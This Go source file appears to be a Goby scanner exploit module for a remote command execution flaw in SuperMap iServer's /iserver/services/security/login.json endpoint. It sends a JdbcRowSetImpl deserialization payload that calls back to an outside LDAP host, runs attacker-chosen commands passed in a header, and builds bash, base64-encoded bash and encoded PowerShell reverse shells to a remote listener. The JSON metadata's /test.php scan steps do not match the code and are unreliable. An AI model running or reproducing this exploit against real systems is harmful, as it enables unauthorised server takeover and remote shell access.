package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
  "regexp"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "SuperMap iServer /login.json Command Execution Vulnerability",
    "Description": "<p>SuperMap iServer is a cloud GIS application server product based on cross-platform GIS kernel, which provides a multi-level expansion of service-oriented GIS development framework from client to server.</p><p>SuperMap iServer/login.json has a remote command execution vulnerability, through which an attacker can execute code arbitrarily on the server, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "SuperMap-iServer",
    "Homepage": "https://www.supermap.com/",
    "DisclosureDate": "2024-09-06",
    "PostTime": "2024-10-12",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/iserver/manager/\" && (body=\"iServerMainPageUI.js\" || body=\"iServer Manager\")",
    "GobyQuery": "body=\"/iserver/manager/\" && (body=\"iServerMainPageUI.js\" || body=\"iServer Manager\")",
    "Level": "2",
    "Impact": "<p>SuperMap iServer/login.json has a remote command execution vulnerability, through which an attacker can execute code arbitrarily on the server, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/141951246"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "SuperMap iServer /login.json 命令执行漏洞",
            "Product": "SuperMap-iServer",
            "Description": "<p>SuperMap iServer 是基于跨平台 GIS 内核的云 GIS 应用服务器产品，该产品提供从客户端到服务器端的多层次扩展的面向服务 GIS 的开发框架。</p><p>SuperMap iServer /login.json存在远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>SuperMap iServer /login.json存在远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SuperMap iServer /login.json Command Execution Vulnerability",
            "Product": "SuperMap-iServer",
            "Description": "<p>SuperMap iServer is a cloud GIS application server product based on cross-platform GIS kernel, which provides a multi-level expansion of service-oriented GIS development framework from client to server.</p><p>SuperMap iServer/login.json has a remote command execution vulnerability, through which an attacker can execute code arbitrarily on the server, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>SuperMap iServer/login.json has a remote command execution vulnerability, through which an attacker can execute code arbitrarily on the server, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	setPayloadRequestHashasfdcuiashyuftuaegshdfksdgfhvuijweisygfvhiujdv := func(hostInfo *httpclient.FixUrl, cmd string) (string, string, error) {
		loopholesRequestConfig := httpclient.NewPostRequestConfig("/iserver/services/security/login.json?_t=1655187360048")
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("Content-Type", "application/json")
		loopholesRequestConfig.Header.Store("cmd", cmd)
		loopholesRequestConfig.Data = `{"rasdnd1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "randfd2": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://` + godclient.GetGodServerHost() + `/A4","autoCommit": true}}`
		resp, err := httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
		if err != nil {
			return "", "", err
		}
		url := "/iserver/services/security/login.json?_t=1655187360048"
		return resp.Utf8Html, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashasfdcuiashyuftuaegshdfksdgfhvuijweisygfvhiujdv

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashasfdcuiashyuftuaegshdfksdgfhvuijweisygfvhiujdv

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				Result = strings.Split(Result, "{\"m")[0]

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					// 定义正则表达式模式
					pattern := `((.|\n)*?){"succeed"`
					// 编译正则表达式
					re := regexp.MustCompile(pattern)
					if !re.MatchString(Result) {
						expResult.Success = false
            expResult.Output = "未找到匹配项"
            return expResult
					}
					// 在文本中查找匹配项
					match := re.FindStringSubmatch(Result)
          expResult.Success = true
					expResult.Output = match[1]
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
